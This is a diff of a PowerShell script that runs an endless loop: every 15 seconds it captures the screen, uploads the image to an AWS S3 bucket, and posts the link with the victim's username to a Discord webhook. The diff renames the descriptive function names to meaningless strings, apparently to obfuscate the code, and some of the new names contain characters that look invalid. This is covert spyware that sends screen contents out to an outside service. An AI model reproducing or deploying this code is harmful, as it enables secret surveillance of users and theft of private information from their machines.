@@ -6,7 +6,7 @@ if (-not (Get-InstalledModule -Name AWS.Tools.Common -ErrorAction SilentlyContin
 Import-Module -Name AWS.Tools.Common
 Import-Module -Name AWS.Tools.S3
 
-function fnCapture {
+function fnfquir22@ {
     param (
         [string]$OutputFilePath
     )
@@ -24,7 +24,7 @@ function fnCapture {
     $bmp.Dispose()
 }
 
-function fnUpload {
+function fnujsaw21@ {
     param (
         [string]$ImageFilePath,
         [string]$BucketName
@@ -40,7 +40,7 @@ function fnUpload {
     return $ImageUrl
 }
 
-function fnSendMessage {
+function fnuja2aw20@ {
     param (
         [string]$WebhookUrl,
         [string]$UserName,
@@ -68,8 +68,8 @@ $awsS3BucketName = "strxt-1"
 
 while ($true) {
     $outputFilePath = "$env:temp\$env:computername-Capture.png"
-    fnCapture -OutputFilePath $outputFilePath
-    $imageUrl = fnUpload -ImageFilePath $outputFilePath -BucketName $awsS3BucketName
-    fnSendMessage -WebhookUrl $discordWebhookUrl -UserName $env:UserName -ImageUrl $imageUrl
+    fnfquir22@ -OutputFilePath $outputFilePath
+    $imageUrl = fnujsaw21@ -ImageFilePath $outputFilePath -BucketName $awsS3BucketName
+    fnuja2aw20@ -WebhookUrl $discordWebhookUrl -UserName $env:UserName -ImageUrl $imageUrl
     Start-Sleep -Seconds 15
 }
